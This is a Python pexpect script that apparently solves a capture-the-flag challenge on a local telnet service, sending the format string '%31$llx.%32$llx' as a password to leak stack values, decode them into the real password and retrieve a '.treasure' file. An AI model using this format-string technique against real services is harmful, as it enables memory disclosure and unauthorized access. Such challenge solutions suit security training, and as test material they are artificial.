import re

import pexpect

# Start the telnet session
child = pexpect.spawn('telnet localhost 8082')

# Expect the initial prompt from the telnet server
child.expect(r'\$ '.encode())

# Send the command that lists directories
child.sendline('scout')

# Handle the output and wait for the directories listing
child.expect(r'\$ '.encode())
directories_output = child.before.decode().replace('\r', '').split('\n')[3:-2]
# Remove everything that doesn't contain exactly two capital letters
directories = [directory for directory in directories_output if len(re.findall(r'[A-Z]', directory)) == 2]
print(f"Directories output: {directories}")  # Debug print to verify output


treasure_dir = ""
treasure_file = ""
# Loop through each directory and scout for the .treasure file
for directory in directories:
    child.sendline(f'scout {directory}')
    child.expect(r'\$ '.encode())
    scout_output = child.before.decode()

    # Check if the .treasure file is in the directory
    if '.treasure' in scout_output:
        print(f".treasure file found in {directory}")
        treasure_dir = directory
        # find the full name of the treasure file
        scout_output = scout_output.replace('\r', '').split('\n')
        for idx, line in enumerate(scout_output):
            if '.treasure' in line:
                treasure_line_idx = idx
                break
        treasure_file = scout_output[treasure_line_idx]


# At this point, we have the directory and file name of the .treasure file

# change to the directory and loot the treasure
child.sendline(f'sail {treasure_dir}')
child.expect(r'\$ '.encode())
child.sendline(f'loot {treasure_file}') 

# Handle the output and wait for the password prompt
child.expect(r'\: '.encode())
# Send the format string exploit as the password
child.sendline('%31$llx.%32$llx')

# Now, wait for the incorrect password message which includes the pattern "is incorrect!"
incorrect_message_pattern = re.compile(rb'(\w+)\.(\w+).*')

# Read the buffer to get the incorrect password message
child.expect(incorrect_message_pattern)

# The output captured will include the incorrect message
incorrect_message = child.match.group(0).decode()
print(f"Incorrect message: {incorrect_message}")  # Debug print to verify output

# Extract the two addresses from the captured groups
address1_hex = child.match.group(1).decode()
address2_hex = child.match.group(2).decode()
print(f'Address 1 Hex: {address1_hex}')  # Debug print to verify address 1 hex
print(f'Address 2 Hex: {address2_hex}')  # Debug print to verify address 2 hex

# Convert the addresses to ASCII and reverse them
address1 = bytes.fromhex(address1_hex).decode()[::-1]
address2 = bytes.fromhex(address2_hex).decode()[::-1]

# Print the password
print(f'Password: {address1}{address2}')

# Now try to plunder the file again
child.expect(r'\$ '.encode())
child.sendline(f'loot {treasure_file}')
child.expect(r'\: '.encode())
child.sendline(f'{address1}{address2}')

# Wait for the output and print it
child.expect(r'\$ '.encode())
print(child.before.decode())

# Exit the telnet session
child.sendline('sail ..')